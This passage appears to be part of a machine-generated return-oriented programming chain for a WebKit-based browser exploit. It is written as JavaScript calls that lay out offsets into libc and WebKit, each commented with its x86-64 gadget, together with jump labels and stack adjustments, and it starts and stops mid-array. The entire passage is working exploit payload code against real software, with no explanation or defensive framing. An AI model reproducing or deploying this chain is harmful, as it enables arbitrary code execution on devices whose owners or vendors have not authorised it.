libc_base+793877, //pop rsi
ropchain+188640, //L3036
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3037:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3039:
ropchain+188760, //L3038
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+195720, //L3040
//L3038:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+188848, //L3043
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3042:
db([4294967236, 4294967295]); // -0x3c
set_gadget(libc_base+792472,); //pop rcx
//L3043:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3045:
db([4294967236, 4294967295]); // -0x3c
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+188976, //L3046
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188992, //L3048
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3046:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3048:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+189144, //L3050
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189176, //L3052
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+189128, //L3049
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189160, //L3051
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3050:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3051:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3052:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+189248, //L3053
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189264, //L3054
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3053:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+189360, //L3056
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+189344, //L3055
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3055:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3056:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189440, //L3057
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3058:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3059:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+189592, //L3061
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189608, //L3062
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+189576, //L3060
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3060:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3061:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+189776, //L3064
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189792, //L3065
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+189760, //L3063
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3063:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3064:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3065:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+189896, //L3067
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+189944, //L3070
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+189912, //L3068
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3067:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3069:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3070:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+190056, //L3071+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+190048, //L3071
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3071:
db([0, 0]); // 0x0
set_gadgets([
ropchain+190072, //L3071+24
ropchain+190088, //L3066
libc_base+811575, //pop rsp
ropchain+192624, //L3072
//L3066:
libc_base+793877, //pop rsi
ropchain+190144, //L3075
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3074:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+792472,); //pop rcx
//L3075:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+190232, //L3076
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190248, //L3078
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+190392, //L3081
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+190360, //L3079
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190376, //L3080
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3079:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3080:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+190464, //L3082
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+190520, //L3085
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3085:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+190616, //L3088
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3087:
db([4294967236, 4294967295]); // -0x3c
set_gadget(libc_base+792472,); //pop rcx
//L3088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+190704, //L3089
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190720, //L3091
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3089:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3091:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+190872, //L3093
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+190904, //L3095
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+190856, //L3092
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190888, //L3094
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3092:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3093:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3094:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3095:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191024, //L3097
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191040, //L3098
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191008, //L3096
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3096:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3097:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3098:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+191128, //L3099
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3099:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191184, //L3102
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3102:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+191272, //L3105
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3104:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+792472,); //pop rcx
//L3105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3107:
db([4294967260, 4294967295]); // -0x24
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+191400, //L3108
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191416, //L3110
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3108:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+191568, //L3112
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191600, //L3114
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+191552, //L3111
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191584, //L3113
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3111:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3112:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3113:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3114:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191696, //L3116
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191680, //L3115
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3115:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3116:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+191792, //L3119
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3118:
db([4294967236, 4294967295]); // -0x3c
set_gadget(libc_base+792472,); //pop rcx
//L3119:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+191880, //L3120
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191896, //L3122
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3120:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3122:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+192048, //L3124
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192080, //L3126
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+192032, //L3123
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192064, //L3125
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3123:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3124:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3126:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+192200, //L3128
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192216, //L3129
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+192184, //L3127
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3127:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3128:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3129:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+192368, //L3131
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192384, //L3132
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192352, //L3130
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3130:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3131:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3132:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+192472, //L3133
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+192504, //L3136
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3133:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3135:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+206806,); //pop rdi
//L3136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+192568, //L3139
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3139:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+192608, //L3137
//L2995:
libc_base+811575, //pop rsp
ropchain+192624, //L3072
//L3137:
libc_base+811575, //pop rsp
ropchain+186496, //L2982
//L3072:
libc_base+793877, //pop rsi
ropchain+192680, //L3142
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3141:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+792472,); //pop rcx
//L3142:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192768, //L3143
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192784, //L3145
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3143:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3145:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+192936, //L3147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+192968, //L3149
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+192920, //L3146
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192952, //L3148
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3146:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3147:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3148:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3149:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193064, //L3151
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193048, //L3150
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3150:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3153:
ropchain+193168, //L3152
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+202408, //L3154
//L3152:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+193256, //L3157
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3156:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L3157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193344, //L3158
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193360, //L3160
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3158:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3160:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+193504, //L3163
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193472, //L3161
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193488, //L3162
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3161:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3162:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3163:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3165:
ropchain+193608, //L3164
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+197048, //L3166
//L3164:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193680, //L3167
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3167:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3168:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3169:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193832, //L3171
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193848, //L3172
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+193816, //L3170
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3170:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3171:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3172:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+193944, //L3173
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193960, //L3174
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3173:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3174:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194072, //L3175
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194056, //L3176
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3176:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+194160, //L3178
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+194144, //L3177
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3177:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194256, //L3179
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194272, //L3180
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L3179:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+194384, //L3181
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194368, //L3182
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3182:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L3181:
db([0, 0]); // 0x0
//L2652:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
